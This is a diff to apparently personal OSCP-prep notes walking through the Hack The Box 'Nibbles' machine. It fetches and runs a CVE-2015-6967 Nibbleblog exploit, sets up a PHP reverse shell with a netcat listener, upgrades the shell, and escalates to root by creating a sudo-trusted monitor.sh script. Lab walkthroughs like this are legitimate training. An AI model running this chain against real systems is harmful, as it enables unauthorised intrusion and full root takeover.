@@ -182,10 +182,21 @@ During OSCP exams, you can only use metasploit once, hence use it only as last r
 
 
 
+wget https://raw.githubusercontent.com/dix0nym/CVE-2015-6967/main/exploit.py -O 6967.py
+...
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1932 (1.9K) [text/plain]
+Saving to: ‘6967.py’
+
+6967.py                                     100%[===========================================================================================>]   1.89K  --.-KB/s    in 0s      
+
+ ‘6967.py’ saved [1932/1932]
 
 
 
-python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
+python3 6967.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload shell.php
 
 
 Kali Linux comes pre-installed with the most famous PHP reverse shell (created by PentestMonkey).
@@ -197,5 +208,136 @@ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
 
 nano shell.php to include our kali machine IP & listening port
 
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '127.0.0.1';  // CHANGE THIS to your kali machine tun0 IP (ifconfig to check)
+$port = 1234;       // CHANGE THIS to your preferred listening port, eg. 443
+
+
+
+┌──(lanc3㉿kali)-[~]
+└─$ sudo rlwrap -cAr nc -lvnp 443 
+[sudo] password for lanc3: 
+listening on [any] 443 ...
+connect to [10.10.14.43] from (UNKNOWN) [10.10.10.75] 55976
+Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 01:25:28 up 1 day,  1:52,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+$ whoami
+nibbler
+$ 
+$ which python python2 python3
+/usr/bin/python3
+$ 
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+nibbler@Nibbles:/$ 
+
+nibbler@Nibbles:/$ 
+
+
+**note**
+exploit 6967.py helped gain access as user **nibbler**, 
+Getting this `nibbler` prompt is the hardest part of the initial access.
+
+currently in a "dumb shell"
+—it’s essentially a one-way pipe with no tab-completion, no interactive features (like `top` or `nano`), and most dangerously, **no job control**.
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+tells Python to "cheat" and create a pseudo-terminal (PTY) that tricks the system into thinking you are logged in via a real console.
+
+
+Next,
+Inspection of `sudo -l` revealed a NOPASSWD entry for a script located in the user's home directory.
+
+nibbler@Nibbles:/$ **sudo -l**
+sudo -l
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/$ 
+
+
+<span style="color: #888888;">Note: This is a classic misconfiguration. By granting root execution rights to a file within a user-writable directory, the system allows any user with access to that directory to escalate to root by simply modifying the script's contents._</span>
+
+
+nibbler@Nibbles:/$ ls -la /home/nibbler/personal/stuff/monitor.sh
+ls -la /home/nibbler/personal/stuff/monitor.sh
+**ls: cannot access '/home/nibbler/personal/stuff/monitor.sh': No such file or directory**
+nibbler@Nibbles:/$ 
+
+
+Since the file and directory do not exist, we can simply build the path and "poison" it with our own code.
+
+### 1. The Hijack Strategy
+
+Because `sudo -l` explicitly trusts the path `/home/nibbler/personal/stuff/monitor.sh`, and that path is inside **our** home directory, we are the master of that domain.
+
+### 2. Execution Steps
+
+Run these commands one by one, with "Sanity Check" f after each step.
+
+**Step A: Create the missing folders**
+
+Bash
+
+```
+mkdir -p /home/nibbler/personal/stuff
+```
+
+**Step B: Create the script with a Bash spawn** 
+Write a simple script that opens a new shell. 
+Run this with `sudo`, that new shell will be root.
+
+
+```
+echo "#!/bin/bash" > /home/nibbler/personal/stuff/monitor.sh
+echo "/bin/bash -i" >> /home/nibbler/personal/stuff/monitor.sh
+```
+
+
+nibbler@Nibbles:/$ echo '#!/bin/bash' > /home/nibbler/personal/stuff/monitor.sh
+</bin/bash' > /home/nibbler/personal/stuff/monitor.sh                        
+nibbler@Nibbles:/$ 
+
+nibbler@Nibbles:/$ echo '/bin/bash -i' >> /home/nibbler/personal/stuff/monitor.sh
+<in/bash -i' >> /home/nibbler/personal/stuff/monitor.sh                      
+nibbler@Nibbles:/$ 
+
+nibbler@Nibbles:/$ cat /home/nibbler/personal/stuff/monitor.sh
+cat /home/nibbler/personal/stuff/monitor.sh
+#!/bin/bash
+/bin/bash -i
+nibbler@Nibbles:/$ 
+
+
+
+**Step C: Make the script executable** 
+If the script isn't executable, `sudo` will refuse to run it.
+
+```
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+```
+
+**Step D:** call the script using the exact path allowed in `sudo -l`.
+
+
+```
+sudo /home/nibbler/personal/stuff/monitor.sh
+```
+
+
+
+![[nibbles-pwned.png]]
+
+
+
+![[nibbles-pwned01.png]]
+
+![[nibbles-pwned02.png]]
